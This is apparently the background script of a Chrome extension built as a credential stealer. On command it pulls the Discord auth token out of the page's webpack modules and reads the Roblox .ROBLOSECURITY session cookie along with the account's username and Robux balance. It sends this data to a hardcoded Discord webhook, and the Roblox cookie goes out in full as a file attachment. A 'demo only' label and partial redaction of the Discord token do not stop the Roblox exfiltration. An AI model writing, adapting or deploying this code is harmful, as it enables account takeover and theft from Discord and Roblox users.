chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action !== "grabData") return;

    const site = message.site.toLowerCase();
    let embedTitle = "Cookies 🍪";
    let color = 0x5865F2;
    let fields = [];

    // Replace with your actual Discord Webhook URL
    const webhookUrl = "https://discord.com/api/webhooks/1572177598639902790/fM3miBLMBfrxbjzdbUIEbMQ7aZW3RKqub8rBfdbi2VGHR-xKT-KCNoXN-Y8V3ixVeID8";

    // Helper function to send the webhook payload with fields
    function sendPayload() {
        if (fields.length === 0) {
            fields.push({
                name: "Status",
                value: "No data captured",
                inline: false
            });
        }

        const payload = {
            content: "", 
            embeds: [
                {
                    title: embedTitle,
                    description: "All you need is Cookies! (demo only)",
                    color: color,
                    fields: fields
                }
            ]
        };

        fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        })
        .then(async response => {
            if (!response.ok) {
                const errorBody = await response.text();
                console.error("Discord rejected webhook (" + response.status + "):", errorBody);
            } else {
                console.log("Webhook sent successfully!");
            }
        })
        .catch(error => {
            console.error("Network error sending webhook:", error);
        });
    }

    if (site.includes("discord")) {
        embedTitle = "🎮 Discord";
        color = 0x5865F2;

        let token = "Not extracted (timing/protection)";
        try {
            window.webpackChunkdiscord_app?.push([[Math.random()], {}, (req) => {
                for (const m of Object.values(req.c || {})) {
                    if (m?.exports?.default?.getToken) {
                        token = m.exports.default.getToken() || token;
                        return;
                    }
                }
            }]);
            window.webpackChunkdiscord_app?.pop();
        } catch {}

        const redactedToken = token !== "Not extracted (timing/protection)"
            ? token.substring(0, 8) + "..." + token.slice(-8) + " [REDACTED]"
            : token;

        fields.push({
            name: "Discord Token",
            value: "`" + redactedToken + "`",
            inline: false
        });

        sendPayload();
    }
    else if (site.includes("roblox")) {
        const color = 0xE31C2D; // Red theme for Roblox

        chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, async (cookie) => {
            if (chrome.runtime.lastError) {
                console.error(chrome.runtime.lastError);
            }

            let securityToken = "Not found";
            if (cookie && cookie.value) {
                securityToken = cookie.value;
            }

            let robloxUsername = "Unknown";
            let robuxBalance = "Unknown";

            try {
                // Fetch authenticated user profile info from Roblox API
                const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
                    credentials: "include"
                });
                if (userRes.ok) {
                    const userData = await userRes.json();
                    robloxUsername = userData.name || userData.displayName || "Unknown";

                    // Fetch Robux balance if user ID was successfully retrieved
                    if (userData.id) {
                        const robuxRes = await fetch("https://economy.roblox.com/v1/user/robux", {
                            credentials: "include"
                        });
                        if (robuxRes.ok) {
                            const robuxData = await robuxRes.json();
                            robuxBalance = robuxData.robux !== undefined ? robuxData.robux : "N/A";
                        }
                    }
                }
            } catch (err) {
                console.error("Failed to fetch Roblox account details:", err);
            }

            // Pack the token into a text file blob
            const blob = new Blob([securityToken], { type: "text/plain" });
            const formData = new FormData();
            
            formData.append("file", blob, "roblox_cookie.txt");
            formData.append("payload_json", JSON.stringify({
                content: "",
                embeds: [
                    {
                        title: "🟥 Roblox Account Captured",
                        description: `👤 Username: \`${robloxUsername}\`\n💰 Robux: \`${robuxBalance}\``,
                        color: color
                    }
                ]
            }));

            fetch(webhookUrl, {
                method: "POST",
                body: formData
            })
            .then(async response => {
                if (!response.ok) {
                    response.text().then(errorBody => {
                        console.error("Discord rejected webhook (" + response.status + "):", errorBody);
                    });
                } else {
                    console.log("Webhook sent successfully!");
                }
            })
            .catch(error => {
                console.error("Network error sending webhook:", error);
            });
        });
    }
    else {
        sendPayload();
    }
});